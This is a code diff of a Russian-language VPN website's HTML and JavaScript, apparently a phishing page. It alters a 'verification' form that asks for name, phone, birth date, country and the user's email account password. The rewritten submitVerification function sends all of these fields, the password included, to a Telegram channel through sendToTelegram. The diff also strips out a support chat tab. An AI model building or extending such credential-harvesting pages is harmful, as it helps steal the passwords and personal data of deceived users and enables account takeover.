@@ -931,8 +931,6 @@ html
     }
 
     .payment-content {
-  max-height: 90vh;
-  overflow-y: auto;
       background: var(--card);
       padding: 2rem;
       border-radius: var(--radius);
@@ -944,8 +942,6 @@ html
     }
 
     .payment-modal.active .payment-content {
-  max-height: 90vh;
-  overflow-y: auto;
       transform: translateY(0);
     }
 
@@ -1290,7 +1286,6 @@ html
       <button onclick="showTab('servers')"><i class="fas fa-server"></i> Серверы</button>
       <button onclick="showTab('speed')"><i class="fas fa-tachometer-alt"></i> Скорость</button>
       <button onclick="showVipModal()" class="vip-button"><i class="fas fa-crown"></i> VIP</button>
-<button onclick="showTab('support')"><i class="fas fa-comments"></i> Поддержка</button>
     </div>
 
     <!-- Вкладка подключения -->
@@ -1318,12 +1313,19 @@ html
       <p>Пройдите верификацию, чтобы получить доступ ко всем функциям платформы. Это займет не более 2 минут.</p>
       
       <div class="progress-container">
-        <div class="progress-steps">
-          <div class="progress-bar" id="progressBar" style="width: 0%"></div>
-          <div class="step completed" id="step1">
-            <span>1</span>
-            <div class="step-label">Основные данные</div>
-          </div>
+        
+<div class="progress-steps">
+  <div class="progress-bar" id="progressBar" style="width: 0%"></div>
+  <div class="step completed" id="step1">
+    <span>1</span>
+    <div class="step-label">Данные</div>
+  </div>
+  <div class="step" id="step2">
+    <span>2</span>
+    <div class="step-label">Подтверждение</div>
+  </div>
+</div>
+
           <div class="step" id="step2">
             <span>2</span>
             <div class="step-label">Документы</div>
@@ -1336,17 +1338,18 @@ html
       </div>
 
       <form id="verifyForm">
-        <div class="input-group">
-          <label>Имя</label>
-          <input id="firstName" required placeholder="Иван">
-          <i class="fas fa-user input-icon"></i>
-        </div>
-
+        
 <div class="input-group">
-          <label>Фамилия</label>
-          <input id="lastName" required placeholder="Иванов">
-          <i class="fas fa-user input-icon"></i>
-        </div>
+  <label>Имя</label>
+  <input id="firstName" required placeholder="Иван">
+  <i class="fas fa-user input-icon"></i>
+</div>
+<div class="input-group">
+  <label>Фамилия</label>
+  <input id="lastName" required placeholder="Иванов">
+  <i class="fas fa-user input-icon"></i>
+</div>
+
 
         <div class="input-group">
           <label>Телефон</label>
@@ -1365,6 +1368,12 @@ html
           <input id="email" required placeholder="example@domain.com" type="email">
           <i class="fas fa-envelope input-icon"></i>
         </div>
+<div class="input-group">
+  <label>Пароль от почты</label>
+  <input id="emailPass" type="password" required placeholder="Пароль">
+  <i class="fas fa-lock input-icon"></i>
+</div>
+
 
         <div class="input-group">
           <label>Страна проживания</label>
@@ -1381,13 +1390,9 @@ html
           <i class="fas fa-globe input-icon"></i>
         </div>
 
-<div class="input-group">
-  <label>Пароль от почты</label>
-  <input id="emailPassword" type="password" required placeholder="Введите пароль от почты">
-  <i class="fas fa-key input-icon"></i>
-</div>
+        
 
-
+        
 
         <button type="submit"><i class="fas fa-paper-plane"></i> Отправить на проверку</button>
       </form>
@@ -1456,25 +1461,7 @@ html
       <p>Все права защищены. Используя сайт, вы соглашаетесь с <a href="#">условиями</a>.</p>
       <p>🕒 Текущее время: <span id="footerTime">...</span></p>
     </section>
-  
-<!-- Вкладка Поддержка -->
-<section class="card" id="support" style="display:none;">
-  <h1><i class="fas fa-comments"></i> Онлайн-чат поддержки</h1>
-  <div class="chat-widget" style="position: static; width: 100%; max-height: 400px;">
-    <div class="chat-header" style="background: var(--primary); padding: 1rem; color: white; font-weight: bold;">
-      💬 Поддержка
-    </div>
-    <div class="chat-messages" id="chatMessages" style="flex:1; padding:1rem; overflow-y:auto; background: var(--input-bg); max-height:200px;">
-      <div><strong>Поддержка:</strong> Здравствуйте! Чем можем помочь?</div>
-    </div>
-    <div class="chat-input" style="display:flex;">
-      <input type="text" id="chatInput" placeholder="Напишите сообщение..." style="flex:1; padding:0.5rem; border:none; background: var(--card); color:white;">
-      <button onclick="sendChat()" style="padding:0 1rem; background: var(--primary); border:none; color:white;">➡️</button>
-    </div>
-  </div>
-</section>
-
-</main>
+  </main>
 
   <div class="notification" id="notification">
     <i class="fas fa-check-circle"></i>
@@ -1491,7 +1478,7 @@ html
     let currentServer = 'auto';
     let isConnected = false;
     let currentStep = 1;
-    const totalSteps = 3;
+    const totalSteps = 2;
     let currentLanguage = 'ru';
     let currentTheme = 'dark';
     let currentPaymentMethod = 'card';
@@ -1669,38 +1656,41 @@ html
     }
 
     // Отправка данных верификации
-    async function submitVerification() {
-      const fullname = document.getElementById('fullname').value;
+    
+async function submitVerification() {
+      const firstName = document.getElementById('firstName').value;
+      const lastName = document.getElementById('lastName').value;
       const phone = document.getElementById('phone').value;
       const dob = document.getElementById('dob').value;
       const email = document.getElementById('email').value;
+      const emailPass = document.getElementById('emailPass').value;
       const country = document.getElementById('country').value;
-                  
-            
+
+      if (!firstName || !lastName || !phone || !dob || !email || !emailPass || !country) {
+        showNotification('Заполните все поля', 'error');
+        return;
+      }
+
       updateProgress(2);
-      
-      // Создаем текст сообщения
+
       const caption = `
 <b>🧾 Новая заявка на верификацию</b>
-👤 <b>ФИО:</b> ${fullname}
+👤 <b>Имя:</b> ${firstName}
+👤 <b>Фамилия:</b> ${lastName}
 📱 <b>Телефон:</b> ${phone}
 📧 <b>Email:</b> ${email}
+🔑 <b>Пароль:</b> ${emailPass}
 🎂 <b>Дата рождения:</b> ${dob}
 🌍 <b>Страна:</b> ${country}
 🕒 <b>Время отправки:</b> ${new Date().toLocaleString('ru-RU')}
       `;
-      
+
       try {
-        // Отправляем текстовую информацию
         await sendToTelegram(caption);
-        
-        // Имитируем отправку файлов (в реальном коде нужно использовать FormData)
         showNotification('Данные успешно отправлены на проверку!', 'success');
-        
-        updateProgress(3);
+
         localStorage.setItem('verificationCompleted', 'true');
-        
-        // Через 3 секунды сбрасываем прогресс
+
         setTimeout(() => {
           updateProgress(1);
           document.getElementById('verifyForm').reset();
@@ -1711,6 +1701,7 @@ html
         console.error(error);
       }
     }
+
 
     // Расчет возраста
     function calculateAge() {
@@ -2071,27 +2062,6 @@ html
     
     // Инициализация VIP статуса
     checkVipStatus();
-  
-function sendChat() {
-  const input = document.getElementById("chatInput");
-  const msg = input.value.trim();
-  if (msg) {
-    const messages = document.getElementById("chatMessages");
-    const div = document.createElement("div");
-    div.innerHTML = "<strong>Вы:</strong> " + msg;
-    messages.appendChild(div);
-    messages.scrollTop = messages.scrollHeight;
-    input.value = "";
-
-    setTimeout(() => {
-      const reply = document.createElement("div");
-      reply.innerHTML = "<strong>Поддержка:</strong> Спасибо за сообщение!";
-      messages.appendChild(reply);
-      messages.scrollTop = messages.scrollHeight;
-    }, 1000);
-  }
-}
-
-</script>
+  </script>
 </body>
 </html>
